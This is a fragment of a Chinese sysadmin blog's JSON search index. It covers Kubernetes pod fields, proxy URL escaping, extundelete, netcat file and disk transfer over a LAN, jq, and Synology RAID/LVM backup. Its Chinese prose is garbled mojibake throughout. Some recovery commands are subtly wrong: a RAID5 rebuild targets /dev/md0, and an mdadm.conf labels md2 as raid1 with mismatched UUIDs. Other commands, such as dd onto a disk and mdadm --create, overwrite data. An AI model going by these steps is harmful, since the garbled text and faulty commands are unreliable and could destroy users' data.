ç‰ˆæœ¬ï¼Œç”±kuberneteså†…éƒ¨å®šä¹‰ï¼Œç‰ˆæœ¬å·å¿…é¡»å¯ä»¥ç”¨ kubectl api-versions æŸ¥è¯¢åˆ° kind ç±»å‹ï¼Œç”±kuberneteså†…éƒ¨å®šä¹‰ï¼Œç‰ˆæœ¬å·å¿…é¡»å¯ä»¥ç”¨ kubectl api-resources æŸ¥è¯¢åˆ° metadata å…ƒæ•°æ®ï¼Œä¸»è¦æ˜¯èµ„æºæ ‡è¯†å’Œè¯´æ˜ï¼Œå¸¸ç”¨çš„æœ‰nameã€namespaceã€labelsç­‰ spec æè¿°ï¼Œè¿™æ˜¯é…ç½®ä¸­æœ€é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œé‡Œé¢æ˜¯å¯¹å„ç§èµ„æºé…ç½®çš„è¯¦ç»†æè¿° status çŠ¶æ€ä¿¡æ¯ï¼Œé‡Œé¢çš„å†…å®¹ä¸éœ€è¦å®šä¹‰ï¼Œç”±kubernetesè‡ªåŠ¨ç”Ÿæˆ specæè¿°æ˜¯ä¸»è¦å…³æ³¨çš„ï¼š\ncontainers \u0026lt;[]Object\u0026gt; å®¹å™¨åˆ—è¡¨ï¼Œç”¨äºå®šä¹‰å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯ nodeName æ ¹æ®nodeNameçš„å€¼å°†podè°ƒåº¦åˆ°æŒ‡å®šçš„NodeèŠ‚ç‚¹ä¸Š nodeSelector \u0026lt;map[]\u0026gt; æ ¹æ®NodeSelectorä¸­å®šä¹‰çš„ä¿¡æ¯é€‰æ‹©å°†è¯¥Podè°ƒåº¦åˆ°åŒ…å«è¿™äº›labelçš„Node ä¸Š hostNetwork æ˜¯å¦ä½¿ç”¨ä¸»æœºç½‘ç»œæ¨¡å¼ï¼Œé»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ volumes \u0026lt;[]Object\u0026gt; å­˜å‚¨å·ï¼Œç”¨äºå®šä¹‰Podä¸Šé¢æŒ‚åœ¨çš„å­˜å‚¨ä¿¡æ¯ restartPolicy é‡å¯ç­–ç•¥ï¼Œè¡¨ç¤ºPodåœ¨é‡åˆ°æ•…éšœçš„æ—¶å€™çš„å¤„ç†ç­–ç•¥ ","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-k8s_resource/","series":null,"tags":null,"title":"Kubernetesä¸­Podèµ„æºæ¸…å•å’Œè§£é‡Š"},{"categories":null,"content":"é‡åˆ°ä¸ªæ€ªé—®é¢˜ï¼Œè®¾ç½®http_proxyçš„æ—¶å€™æœ‰ç”¨æˆ·å¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\n1export http_proxy=http://user\\2016:PmnQ 2016@192.168.0.1:3128 ç»“æœä¸ç”Ÿæ•ˆï¼Œä»”ç»†è§‚å¯Ÿä¸Šé¢çš„å‘½ä»¤ï¼š\nç”¨æˆ·åå…¶å®æ˜¯ï¼š\u0026ldquo;user\\2016\u0026rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªåæ–œæ \\\nè€Œå¯†ç æ˜¯ï¼š\u0026ldquo;PmnQ 2016\u0026rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªç©ºæ ¼\nè¿™ä¸‹éº»çƒ¦äº†ï¼Œå‘½ä»¤è¿‡ä¸å»å•Šã€‚\nåå¤æœç´¢æ‰¾åˆ°äº†å­—ç¬¦è½¬ä¹‰è¡¨ï¼Œç¬¬ä¸€ä¸ªå›¾æ˜¯å¯ä»¥å®‰å…¨è½¬ä¹‰çš„ï¼š\nä¸‹é¢è¿™å¼ æ˜¯ä¸å®‰å…¨çš„ï¼š\nè½¬ä¸€ä¸‹å§ï¼š \\ çš„16è¿›åˆ¶HEXæ˜¯%5Cï¼Œç©ºæ ¼çš„16è¿›åˆ¶HEXæ˜¯%20\næœ€åçš„è¯­æ³•ï¼š\n1export http_proxy=http://user%5C2016:PmnQ%202016@192.168.0.1:3128 æå®šæ”¶å·¥ã€‚\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-url_encode/","series":null,"tags":null,"title":"Urlä¸­çš„å­—ç¬¦è½¬ä¹‰"},{"categories":null,"content":"è€ƒå¤ç¯‡ï¼Œè®°å½•ä¸‹æ¥ï¼Œç°åœ¨éƒ½æ˜¯xfsäº†ï¼Œä½†æ˜¯æ–¹æ³•ä¸èƒ½å¿˜å•Šï¼\næ¢å¤è¿‡ç¨‹å¦‚ä¸‹ï¼š\n1ã€å®‰è£…extundelete 1yum -y install e2fsprogs e2fsprogs-libs e2fsprogs-devel 2wget http://jaist.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2 3tar -jxvf extundelete-0.2.4.tar.bz2 4cd extundelete-0.2.4 5./configure 6make 7make install 2ã€å¸è½½è¦æ¢å¤çš„åˆ†åŒº å¦‚æœä½ è¯¯åˆ é™¤çš„åˆ†åŒºæ˜¯/dev/sda2,é‚£ä¹ˆé¦–å…ˆéœ€è¦umount è¿™ä¸ªåˆ†åŒºçš„æŒ‚è½½ç‚¹\n3ã€å¼€å§‹æ¢å¤ é¦–å…ˆdf -lhæŸ¥çœ‹åˆ†åŒºçš„ä½¿ç”¨æƒ…å†µï¼Œé€‰æ‹©ä¸€ä¸ªå‰©ä½™ç©ºé—´è¶³å¤Ÿå®¹çº³è¦æ¢å¤çš„æ–‡ä»¶å¤§å°çš„åˆ†åŒºï¼Œä¾‹å¦‚ä½ çš„/homeåˆ†åŒºå‰©ä½™100Gï¼Œä½ éœ€è¦æ¢å¤çš„æ–‡ä»¶å°äº100Gï¼Œé‚£ä¹ˆä½ å¯ä»¥cd /home ç„¶åè¿›è¡Œæ¢å¤æ“ä½œ\n1cd /home æ¢å¤å•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹\n1extundelete /dev/mapper/vg_localhost-lv_home â€“restore-files æ–‡ä»¶å æˆ‘æ˜¯ç›´æ¥æ¢å¤æ•´ä¸ªåˆ†åŒº\n1extundelete /dev/mapper/vg_localhost-lv_home â€“restore-all ç„¶åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªæ¢å¤æ–‡ä»¶å¤¹ï¼Œè¿›å»æ‰¾ä½ è¦çš„æ–‡ä»¶å°±å¯ä»¥äº†\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-extundelete/","series":null,"tags":null,"title":"å¦‚ä½•é€šè¿‡extundeleteæ¢å¤åˆ é™¤æ–‡ä»¶"},{"categories":null,"content":"ä¸€ã€è¿œç¨‹ä¼ è¾“æ–‡ä»¶å‹ç¼©åŒ…\n1tar zcvf - /export/A0 | nc 192.168.86.5 8732 2 3nc -l 8732 \u0026gt; A0.tar.gz æ–¹å‘å€’è¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨æœåŠ¡ç«¯å‹ç¼©æ–‡ä»¶\n1tar zcvf - /export/A0 | nc -l -p8732 2 3nc 192.168.86.5 8732 \u0026gt; A0.tar.gz äºŒã€è¿œç¨‹ä¼ è¾“æ•´ä¸ªç›®å½•\n1tar cvf - /export/A0 | nc 192.168.86.5 8732 2 3nc -l 8732 | tar xvf - ä¸‰ã€è¿œç¨‹å¤‡ä»½åˆ†åŒºåˆ°ä¸€ä¸ªæ–‡ä»¶\n1dd if=/dev/sdb | gzip -c | nc 192.168.86.5 8732 2 3nc -lp 8732 | dd of=/backup/sdb.img.gz å››ã€å°†è¿œç¨‹åˆ†åŒºå¤‡ä»½æ–‡ä»¶æ‹‰åˆ°æœ¬åœ°å¹¶æ¢å¤åˆ†åŒº\n1cat /backup/sdb.img.gz | nc 192.168.86.5 8732 2 3nc -lp 8732 | gunzip -c | sudo dd of=/dev/sdb ","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-netcat/","series":null,"tags":null,"title":"Netcatçš„ä¸€äº›è¿œç¨‹ç”¨æ³•"},{"categories":null,"content":"å¾ˆçƒ¦èºçš„é—®é¢˜ï¼ŒTerminal ç»ˆç«¯æ˜¯UTF8ï¼Œæ˜¾ç¤ºæ— é—®é¢˜ã€‚\nå¯æ˜¯è¿è¡Œ screen åå°±ä¹±ç ï¼Œscreen åçš„ env ç¯å¢ƒè·Ÿä¹‹å‰ä¸€æ ·ï¼Œå®Œå…¨æ— é—®é¢˜\nè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\nåœ¨è‡ªå·±ç”¨æˆ·çš„.screenrcä¸­åŠ ä¸¤å¥\n1defencoding utf-8 2encoding utf-8 utf-8 å¾—æŠŠç¯å¢ƒå˜é‡å¸¦åˆ°screenä¸­ï¼Œæ‰è¡Œã€‚\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-screen_utf/","series":null,"tags":null,"title":"Linuxä¸‹Screenä¹±ç "},{"categories":null,"content":"ç¼ºçœjenkinsçš„execute shellçš„æ–¹å¼æ˜¯å¦‚ä¸‹å¸¦ç€å‚æ•°çš„ï¼š\n1sh -xe hudsonxxx.sh è¯´æ˜ä¸€ä¸‹ï¼š\n1-e æ‰“å¼€å¼€å…³ è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ; 2+e å…³ä¸Šå¼€å…³ 3 4-x æ‰“å¼€å¼€å…³ è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ 5+x å…³ä¸Šå¼€å…³ è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼š\n1set -e è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ; 2 3set -x è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ 4 5set -o pipefail è¡¨ç¤ºåœ¨ç®¡é“è¿æ¥çš„å‘½ä»¤åºåˆ—ä¸­ï¼Œåªè¦æœ‰ä»»ä½•ä¸€ä¸ªå‘½ä»¤è¿”å›é0å€¼ï¼Œåˆ™æ•´ä¸ªç®¡é“è¿”å›é0å€¼ï¼Œå³ä½¿æœ€åä¸€ä¸ªå‘½ä»¤è¿”å›0. æ³¨æ„åœ¨å¼•ç”¨nvmä»¥åŠmeteorçš„ç¯å¢ƒä¸­ï¼Œè¦è®¾ç½®set +e å¦åˆ™source nvm.shçš„è¿‡ç¨‹å®¹æ˜“å‡ºé”™ï¼\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-jenkins_shell/","series":null,"tags":null,"title":"Jenkinsä¸­execute Shellçš„æ³¨æ„äº‹é¡¹"},{"categories":null,"content":"æœ€è¿‘è°ƒè¯•Elasticsearchæ¯”è¾ƒå¤šï¼Œè€ç”¨curlæ¥æŸ¥çœ‹æ•°æ®ï¼Œpretty=onå›ºç„¶æ˜¯å¥½ï¼Œå¯æ˜¯å¦‚æœè¦å…·ä½“çœ‹ä¼ å›æ¥çš„jsonæ•°æ®ï¼Œè¿˜æ˜¯ä¸æ–¹ä¾¿ï¼Œå¦å¤–å¦‚æœæƒ³åœ¨shellé‡Œå¤„ç†jsonæ ¼å¼ï¼Œå°±ä¸çŸ¥é“å¦‚ä½•æ˜¯å¥½äº†ã€‚å°±è¢«è¿«æ”¹ç”¨pythonäº†ï¼Œæœ‰æ²¡æœ‰åœ¨shellä¸‹è°ƒè¯•jsonçš„å·¥å…·å‘¢ï¼Ÿ\næœ‰ï¼Œå°±æ˜¯jqï¼Œå®‰è£…so easyï¼š\n1wget http://stedolan.github.io/jq/download/linux32/jq (32-bit system) 2wget http://stedolan.github.io/jq/download/linux64/jq (64-bit system) 3chmod +x ./jq 4mv jq /usr/local/bin ç»™ä¸ªjsonæ ·æœ¬æ–‡ä»¶\n1cat google.json 2{ 3 \u0026#34;name\u0026#34;: \u0026#34;Google\u0026#34;, 4 \u0026#34;location\u0026#34;: 5 { 6 \u0026#34;street\u0026#34;: \u0026#34;1600 Amphitheatre Parkway\u0026#34;, 7 \u0026#34;city\u0026#34;: \u0026#34;Mountain View\u0026#34;, 8 \u0026#34;state\u0026#34;: \u0026#34;California\u0026#34;, 9 \u0026#34;country\u0026#34;: \u0026#34;US\u0026#34; 10 }, 11 \u0026#34;employees\u0026#34;: 12 [ 13 { 14 \u0026#34;name\u0026#34;: \u0026#34;Michael\u0026#34;, 15 \u0026#34;division\u0026#34;: \u0026#34;Engineering\u0026#34; 16 }, 17 { 18 \u0026#34;name\u0026#34;: \u0026#34;Laura\u0026#34;, 19 \u0026#34;division\u0026#34;: \u0026#34;HR\u0026#34; 20 }, 21 { 22 \u0026#34;name\u0026#34;: \u0026#34;Elise\u0026#34;, 23 \u0026#34;division\u0026#34;: \u0026#34;Marketing\u0026#34; 24 } 25 ] 26} çœ‹ä¸Šé¢ï¼Œ{}æ‹¬èµ·æ¥çš„æ˜¯å¯¹è±¡ï¼Œå¦‚æœæ˜¯[]æ‹¬èµ·æ¥çš„å°±æ˜¯æ•°ç»„äº†ï¼Œnodejsè¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œå…¶å®jsonæ˜¯jsçš„Objectçš„å­é›†ã€‚\nè·å–å¯¹è±¡ï¼š\n1cat google.json | jq \u0026#39;.name\u0026#39; 2\u0026#34;Google\u0026#34; è·å–åµŒå¥—å¯¹è±¡ï¼š\n1cat google.json | jq \u0026#39;.location.city\u0026#39; 2\u0026#34;Mountain View\u0026#34; è·å–ä¸€ä¸ªæ•°ç»„çš„å€¼ï¼š\n1cat google.json | jq \u0026#39;.employees[0].name\u0026#39; 2\u0026#34;Michael\u0026#34; è·å–å¯¹è±¡çš„å¤šä¸ªå­—æ®µï¼š\n1cat google.json | jq \u0026#39;.location | {street, city}\u0026#39; 2{ 3 \u0026#34;city\u0026#34;: \u0026#34;Mountain View\u0026#34;, 4 \u0026#34;street\u0026#34;: \u0026#34;1600 Amphitheatre Parkway\u0026#34; 5} å¾ˆç®€å•å§ï¼Œå’Œcurlç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥åœ¨shellè¿›è¡Œç¼–ç¨‹å¤„ç†jsonæ–‡ä»¶äº†ã€‚\ncurlå’Œjqç»“åˆçš„ä¾‹å­ï¼š\n1curl -s ... | jq . å¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸æƒ³è¦å­—ç¬¦ä¸²çš„å¼•å·ï¼Œ-rå³å¯\n1curl -s ... | jq \u0026#39;.location.city\u0026#39; 2\u0026#34;Mountain View\u0026#34; 3 4curl -s ... | jq -r \u0026#39;.location.city\u0026#39; 5Mountain View å¦‚æœè¦è®¡ç®—æŸä¸ªæ•°ç»„çš„é•¿åº¦ï¼Œlength\n1curl -s ... | jq \u0026#39;.data | length\u0026#39; æœ€åæ”¾ä¸ŠDocumentï¼š\nhttps://stedolan.github.io/jq/manual/ jqç°åœ¨å·²ç»åˆ°1.7äº†ï¼Œæœ‰å¾ˆå¤šæ–°ç”¨æ³•ï¼Œå¯ä»¥è®¡ç®—ç­‰ç­‰ï¼Œç”¨æ³•å¤§å…¨ï¼š\nhttp://hyperpolyglot.org/json ","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-jq/","series":null,"tags":null,"title":"Linuxä¸‹å¦‚ä½•åœ¨å‘½ä»¤è¡Œä¸‹è§£æå¤„ç†jsonæ–‡ä»¶"},{"categories":null,"content":"å¦‚æœå•ç‹¬æ‰§è¡Œmountå‘½ä»¤ï¼Œæ˜¾ç¤ºçš„ä¼šå¾ˆæ‚ä¹±ï¼š\n1mount 2/dev/sda3 on / type ext4 (rw) 3proc on /proc type proc (rw) 4sysfs on /sys type sysfs (rw) 5devpts on /dev/pts type devpts (rw,gid=5,mode=620) 6tmpfs on /dev/shm type tmpfs (rw) 7/dev/sda1 on /boot type ext4 (rw) 8none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) 9sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw) 10You have mail in /var/spool/mail/root ä¹±ä½œä¸€å›¢ï¼Œé‚£ä¹ˆæ€ä¹ˆè®©è¿™äº›æ˜¾ç¤ºæ•´é½ä¸€äº›å‘¢ï¼Ÿ\n1mount |column -t 2/dev/sda3 on / type ext4 (rw) 3proc on /proc type proc (rw) 4sysfs on /sys type sysfs (rw) 5devpts on /dev/pts type devpts (rw,gid=5,mode=620) 6tmpfs on /dev/shm type tmpfs (rw) 7/dev/sda1 on /boot type ext4 (rw) 8none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) 9sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw) æ•´é½å¤šäº†ï¼Œå¯¹å§ã€‚\nè®°ä½column -tè¿™ä¸ªå‘½ä»¤ï¼Œå¯ä»¥å¯¹è¾“å‡ºè¿›è¡Œå¯¹é½æ“ä½œï¼ï¼ï¼\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-mount_beauty/","series":null,"tags":null,"title":"Linuä¸‹å¦‚ä½•è®©mountæ˜¾ç¤ºçš„å¾ˆæ•´é½"},{"categories":null,"content":"æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ï¼ï¼ï¼\né‡è¦çš„è¯è¯´ä¸‰éï¼Œè¯è¯´è‡ªå·±ä¹°äº†ä¸ªé»‘ç¾¤æ™–ï¼Œ6ç›˜ä½çš„ï¼Œå°±æ˜¯ä¸ºäº†ä¿å­˜ç…§ç‰‡å’Œæ•°æ®\u0026hellip;\u0026hellip;\nå…¶å®1ç›˜å’Œ2ç›˜çš„naséƒ½æ˜¯è€æµæ°“ï¼Œæ ¹æœ¬æ— ç”¨ï¼Œå¿…é¡»æ˜¯4ç›˜ä½ä»¥ä¸Šçš„æ‰å‹‰å¼ºå¯é ã€‚æ‰€ä»¥æ‰ä¹°çš„è¿™ä¸ªé»‘ç¾¤æ™–ï¼Œåªä¹°äº†3ä¸ªç›˜åšäº†raid5ï¼Œä¾¥æ˜¯å¦‚æ­¤ï¼ŒçœŸçš„æ˜¯è«ååäº†ä¸€å—ï¼Œå¥½åœ¨åœ¨ä¿ä¿®æœŸå†…ï¼Œæ›´æ¢ä¸€å—åæ•…éšœè§£é™¤ï¼ŒæœŸé—´å€’è…¾2å—ç›˜çš„æ•°æ®ä¾ç„¶æ˜¯å™©æ¢¦å•Šã€‚\né‚£ä¹ˆæ•°æ®å¦‚æ­¤é‡è¦ï¼Œé‚£ä¹ˆæ€ä¹ˆåšåˆ°å®Œå…¨çš„å¤‡ä»½å‘¢ï¼Ÿ\næ•°æ®æ˜¯3ç›˜raid5ï¼Œå·²ç»æœ‰ä¿è¯äº†ï¼Œå‰©ä¸‹å°±æ˜¯ç³»ç»Ÿä¹Ÿå¿…é¡»æœ‰å¤‡ä»½å¯æ¢å¤æ‰å¯ä»¥\nç¾¤æ™–æœ¬è´¨æ˜¯linuxï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯mdadm+lvmï¼Œæ‰€ä»¥å¤‡ä»½ä¹Ÿå¿…é¡»ä»è¿™ä¸ªæ–¹å‘å¼€å§‹ã€‚\né¦–å…ˆæ˜¯å¤‡ä»½å¯åŠ¨çš„usbç›˜ï¼Œå…ˆfdisk -l çœ‹ä¸€ä¸‹ï¼š\n1Disk /dev/sda: 2000.3 GB, 2000398934016 bytes 2255 heads, 63 sectors/track, 243201 cylinders 3Units = cylinders of 16065 * 512 = 8225280 bytes 4 5 Device Boot Start End Blocks Id System 6/dev/sda1 1 311 2490240 fd Linux raid autodetect 7Partition 1 does not end on cylinder boundary 8/dev/sda2 311 572 2097152 fd Linux raid autodetect 9Partition 2 does not end on cylinder boundary 10/dev/sda3 588 243201 1948793440+ fd Linux raid autodetect 11 12Disk /dev/sdb: 2000.3 GB, 2000398934016 bytes 13255 heads, 63 sectors/track, 243201 cylinders 14Units = cylinders of 16065 * 512 = 8225280 bytes 15 16 Device Boot Start End Blocks Id System 17/dev/sdb1 1 311 2490240 fd Linux raid autodetect 18Partition 1 does not end on cylinder boundary 19/dev/sdb2 311 572 2097152 fd Linux raid autodetect 20Partition 2 does not end on cylinder boundary 21/dev/sdb3 588 243201 1948793440+ fd Linux raid autodetect 22 23Disk /dev/sdc: 2000.3 GB, 2000398934016 bytes 24255 heads, 63 sectors/track, 243201 cylinders 25Units = cylinders of 16065 * 512 = 8225280 bytes 26 27 Device Boot Start End Blocks Id System 28/dev/sdc1 1 311 2490240 fd Linux raid autodetect 29Partition 1 does not end on cylinder boundary 30/dev/sdc2 311 572 2097152 fd Linux raid autodetect 31Partition 2 does not end on cylinder boundary 32/dev/sdc3 588 243201 1948793440+ fd Linux raid autodetect 33 34Disk /dev/sdu: 4227 MB, 4227858432 bytes 354 heads, 32 sectors/track, 64512 cylinders 36Units = cylinders of 128 * 512 = 65536 bytes 37 38 Device Boot Start End Blocks Id System 39/dev/sdu1 * 1 256 16352+ e Win95 FAT16 (LBA) 3å—2Tçš„ç›˜ï¼Œæ¯ä¸ªç›˜æœ‰3ä¸ªåˆ†åŒºï¼Œç„¶åæœ€åæ˜¯USBç›˜ï¼Œç›˜ç¬¦sduï¼Œå¤‡ä»½å®ƒ\n1dd if=/dev/sdu |gzip -c \u0026gt; /root/usb.img USBç›˜å¤‡å¥½äº†ï¼Œä¸‹é¢å¾—å¤‡ä»½raidäº†ï¼Œå…ˆæŸ¥çœ‹raidä¿¡æ¯ï¼š\n1cat /proc/mdstat 2Personalities : [linear] [raid0] [raid1] [raid10] [raid6] [raid5] [raid4] 3md2 : active raid5 sda3[0] sdc3[2] sdb3[1] 4 3897584512 blocks super 1.2 level 5, 64k chunk, algorithm 2 [3/3] [UUU] 5 6md1 : active raid1 sda2[0] sdb2[1] sdc2[2] 7 2097088 blocks [12/3] [UUU___] 8 9md0 : active raid1 sda1[0] sdb1[1] sdc1[2] 10 2490176 blocks [12/3] [UUU___] çœ‹æ¥æœ‰ä¸‰ä¸ªraidç»„ï¼Œmd0å’Œmd1æ˜¯raid1ï¼Œmd2æ˜¯raid5\nmd0çš„ç»„å‘˜æ˜¯sda1ã€sdb1ã€sdc1\nmd1çš„ç»„å‘˜æ˜¯sda2ã€sdb2ã€sdc2\nmd2çš„ç»„å‘˜æ˜¯sda3ã€sdb3ã€sdc3\nä¸‰ä¸ªç›˜çš„åˆ†åŒºåº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸ªå³å¯ï¼š\n1fdisk -l /dev/sda 2 3Disk /dev/sda: 2000.3 GB, 2000398934016 bytes 4255 heads, 63 sectors/track, 243201 cylinders 5Units = cylinders of 16065 * 512 = 8225280 bytes 6 7 Device Boot Start End Blocks Id System 8/dev/sda1 1 311 2490240 fd Linux raid autodetect 9Partition 1 does not end on cylinder boundary 10/dev/sda2 311 572 2097152 fd Linux raid autodetect 11Partition 2 does not end on cylinder boundary 12/dev/sda3 588 243201 1948793440+ fd Linux raid autodetect æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯2Tçš„ç›˜ï¼Œä¸‰ä¸ªåˆ†åŒºçš„èµ·å§‹æŸ±å¤´ä¿¡æ¯éƒ½å¾ˆæ¸…æ™°ï¼Œè®°å½•ä¸‹æ¥ã€‚\næ‰€ä»¥ï¼Œå¦‚æœåäº†ï¼Œçœ‹çœ‹åˆ†åŒºï¼Œåˆ†åŒºæ²¡åç›´æ¥è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œåˆ†åŒºåäº†çš„è¯ï¼Œæˆ‘ä»¬å…ˆfdiskåˆ†å¥½åŒºï¼Œç„¶åå¼€å§‹ä¿®å¤ï¼š\næŸ¥çœ‹å„ä¸ªmdçš„uuidï¼š\n1mdadm --examine --scan /dev/sda1 /dev/sdb1 /dev/sdc1 2ARRAY /dev/md0 UUID=35d393bd:1f4dde6b:3017a5a8:c86610be 3mdadm --examine --scan /dev/sda2 /dev/sdb2 /dev/sdc2 4ARRAY /dev/md1 UUID=8f02f0d4:e249900a:3017a5a8:c86610be 5mdadm --examine --scan /dev/sda3 /dev/sdb3 /dev/sdc3 6ARRAY /dev/md/2 metadata=1.2 UUID=d1411045:24723563:3a19cef5:07732afa name=DiskStation:2 ä¿®å¤çš„æ—¶å€™ï¼Œæ ¹æ®ä¸Šé¢ä¿¡æ¯ï¼Œç¼–è¾‘ç”Ÿæˆ/etc/mdadm.confï¼Œæ³¨æ„é¡ºåºæ˜¯å€’çš„ï¼Œ md0-\u0026gt;md1-\u0026gt;md2ï¼Œdevicesä¸­å¦‚æœä¸€å—ç›˜åäº†ï¼Œæ”¹æˆmissing\u0026hellip;\u0026hellip;\n1DEVICE partitions 2ARRAY /dev/md0 level=raid1 num-devices=2 3 â†ªUUID=b3cd99e7:d02be486:b0ea429a:e18ccf65 4 â†ªdevices=/dev/sda1,missing 5ARRAY /dev/md1 level=raid1 num-devices=2 6 â†ªUUID=75fa22aa:9a11bcad:b42ed14a:b5f8da3c 7 â†ªdevices=/dev/sda2,missing 8ARRAY /dev/md2 level=raid1 num-devices=2 9 â†ªUUID=532502de:90e44fb0:242f485f:f02a2565 10 â†ªdevices=/dev/sda3,missing ç„¶ååˆ·æ–°raidå¹¶æŸ¥çœ‹raidæ˜¯å¦æ­£å¸¸\n1mdadm -A -s 2cat /proc/mdstat å¦‚æœè¦å…¨é¢æ¯äº†ç›˜é˜µï¼Œé‡å»ºmdï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\n1mdadm --create --verbose /dev/md0 --level=1 --raid-devices=3 /dev/sda1 /dev/sdb1 /dev/sdc1 2 3mdadm --create --verbose /dev/md1 --level=1 --raid-devices=3 /dev/sda2 /dev/sdb2 /dev/sdc2 4 5mdadm --create --verbose /dev/md0 --level=5 --raid-devices=3 /dev/sda3 /dev/sdb3 /dev/sdc3 ä¸Šé¢å·²ç»åšå¥½äº†RAIDéƒ¨åˆ†MDçš„å¤‡ä»½ã€‚LVMæ˜¯åŸºäºMDä¹‹ä¸Šçš„ï¼Œä¸‹é¢æˆ‘ä»¬æ¥å¤‡ä»½LVMã€‚\né¦–å…ˆæŸ¥çœ‹å·ä¿¡æ¯ï¼š\n1DiskStation\u0026gt; pvdisplay 2 --- Physical volume --- 3 PV Name /dev/md2 4 VG Name vg1 5 PV Size 3.63 TB / not usable 2.88 MB 6 Allocatable yes (but full) 7 PE Size (KByte) 4096 8 Total PE 951558 9 Free PE 0 10 Allocated PE 951558 11 PV UUID 5li2xk-tZdQ-c63W-qpM7-jo9F-5xGg-xFP1Wr 12 13DiskStation\u0026gt; vgdisplay 14 --- Volume group --- 15 VG Name vg1 16 System ID 17 Format lvm2 18 Metadata Areas 1 19 Metadata Sequence No 3 20 VG Access read/write 21 VG Status resizable 22 MAX LV 0 23 Cur LV 2 24 Open LV 1 25 Max PV 0 26 Cur PV 1 27 Act PV 1 28 VG Size 3.63 TB 29 PE Size 4.00 MB 30 Total PE 951558 31 Alloc PE / Size 951558 / 3.63 TB 32 Free PE / Size 0 / 0 33 VG UUID UUCftW-HIFK-vmL0-0MTG-XzOT-BCTI-okhVf3 34 35DiskStation\u0026gt; lvdisplay 36 --- Logical volume --- 37 LV Name /dev/vg1/syno_vg_reserved_area 38 VG Name vg1 39 LV UUID BmrrfE-vjMY-rJO8-C7OP-2los-KfeO-1hBrWb 40 LV Write Access read/write 41 LV Status available 42 # open 0 43 LV Size 12.00 MB 44 Current LE 3 45 Segments 1 46 Allocation inherit 47 Read ahead sectors auto 48 - currently set to 384 49 Block device 253:0 50 51 --- Logical volume --- 52 LV Name /dev/vg1/volume_1 53 VG Name vg1 54 LV UUID 80vCET-1yH4-KMXS-E0N7-3tiP-m24I-Gzw7ij 55 LV Write Access read/write 56 LV Status available 57 # open 1 58 LV Size 3.63 TB 59 Current LE 951555 60 Segments 1 61 Allocation inherit 62 Read ahead sectors auto 63 - currently set to 4096 64 Block device 253:1 ok, å¤‡ä»½\n1vgcfgbackup å¤‡ä»½æ–‡ä»¶ä¼šæ”¾åˆ°/etc/lvm/backup/vg1ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶æ‹·èµ°.\nå¦‚æœè¦æ¢å¤ï¼š\n1vgcfgrestore -f vg1 vg1 2pvscan 3vgscan 4lvscan æŠŠuç›˜æ–‡ä»¶ã€fdiskæ–‡ä»¶ã€lvmçš„æ–‡ä»¶æ‹·å‡ºæ¥æ”¾åˆ°dropboxï¼Œä¸€åˆ‡å°±å¦¥å½“äº†ã€‚\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-qunhui_backup/","series":null,"tags":null,"title":"ç¾¤æ™–(é»‘ç¾¤æ™–)çš„å¤‡ä»½"},{"categories":null,"content":"ç”¨ffmpegå°±å¾ˆç®€å•äº†\né¦–å…ˆæŠŠè¦åˆå¹¶çš„jpgéƒ½å˜æˆåˆé€‚çš„å°ºå¯¸\n1convert -resize 300x *.jpg ç„¶åå˜gif\n1convert -delay 30 